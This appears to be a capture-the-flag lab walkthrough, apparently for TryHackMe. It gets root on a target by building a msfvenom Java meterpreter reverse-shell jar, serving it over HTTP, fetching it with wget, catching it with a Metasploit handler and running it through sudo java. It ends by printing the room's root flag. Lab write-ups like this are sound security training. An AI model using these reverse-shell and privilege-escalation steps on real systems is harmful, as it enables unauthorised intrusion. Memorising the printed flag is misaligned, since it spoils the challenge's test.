#Attacking_machine 
1. Create a jar file with java/meterpreter/reverse_tcp shell.

```
msfvenom -p java/meterpreter/reverse_tcp LHOST=<ATTACKING MACHIINE IP> lport=443 -f raw -o java.jar
```

2. Open a python web server.

```
python3 -m http.server 80
```

#SSH_conection 
3.  Download the file `java.jar.`

```
wget http://<ATTACKING MACHINE IP>/java.jar
```

#Attacking_machine 
4. Open a metasploit.

```
msfconsole
msf6 > use exploit/multi/handler 
msf6 exploit(multi/handler) > set payload java/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LhOST <ATTACKING MACHINE>
msf6 exploit(multi/handler) > set LPORT 443   /* Same port you used with msfvenom.
msf6 exploit(multi/handler) > run
```

#SSH_conection 
5. Run the `jave.jar`.

```
sudo -u root /usr/bin/java -jar java.jar
```

You got a reverse shell on meterpreter.

![[Screenshot_2025-10-18_05-29-28.png]]

#Meterpreter
6. Get a shell on `meterpreter` and check the `id`.

```
meterpreter > shell
id
```

![[Screenshot_2025-10-18_05-41-08.png]]

You are root.

## Get the flag

#Meterpreter 
- Go to /root and see the flag.

```
cd /root
cat root.txt
```


> [!Question] What is the root flag? (root.txt)
> THM{464c29e3ffae05c2e67e6f0c5064759c}
